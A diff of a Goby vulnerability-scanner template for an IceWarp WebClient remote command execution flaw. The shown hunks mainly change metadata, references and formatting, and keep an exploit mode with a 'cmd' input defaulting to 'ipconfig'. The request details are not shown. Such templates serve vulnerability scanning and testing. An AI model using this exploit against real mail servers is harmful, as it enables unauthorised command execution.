@@ -1,31 +1,26 @@
 {
       "Name": "IceWarp WebClient basic RCE",
       "Level": "3",
-      "Tags": [
-            "rce"
-      ],
+      "Tags": [],
       "GobyQuery": "body=\"Powered by IceWarp\"",
-      "Description": "IceWarp",
-      "Product": "IceWarp",
-      "Homepage": "http://www.icewarp.cn/",
-      "Author": "",
-      "Impact": "IceWarp WebClient basic RCE",
-      "Recommendation": "",
+      "Description": "",
+      "Product": "",
+      "Homepage": "https://gobies.org/",
+      "Author": "luckying",
+      "Impact": "",
+      "Recommandation": "",
       "References": [
-            "https://www.pwnwiki.org/index.php?title=IceWarp_WebClient_basic_%E9%81%A0%E7%A8%8B%E5%91%BD%E4%BB%A4%E5%9F%B7%E8%A1%8C%E6%BC%8F%E6%B4%9E"
+            "https://gobies.org/"
       ],
-      "HasExp": true,
-      "ExpParams": [
-            {
-                  "Name": "cmd",
-                  "Type": "input",
-                  "Value": "ipconfig"
-            }
-      ],
-      "ExpTips": {
-            "Type": "",
-            "Content": ""
-      },
+	  "HasExp": true,
+	  "ExpParams": [
+		{
+			"name": "cmd",
+			"type": "input",
+			"value": "ipconfig",
+			"show": ""
+		}
+	  ],
       "ScanSteps": [
             "AND",
             {
@@ -55,7 +50,7 @@
                   "SetVariable": []
             }
       ],
-      "ExploitSteps": [
+	  "ExploitSteps": [
             "AND",
             {
                   "Request": {
@@ -82,10 +77,10 @@
                         ]
                   },
                   "SetVariable": [
-                        "output|lastbody|undefined|undefined"
-                  ]
+					"output|lastbody"
+				  ]
             }
       ],
-      "PostTime": "0000-00-00 00:00:00",
-      "GobyVersion": "0.0.0"
+      "PostTime": "2021-06-19 13:19:47",
+      "GobyVersion": "1.8.268"
 }
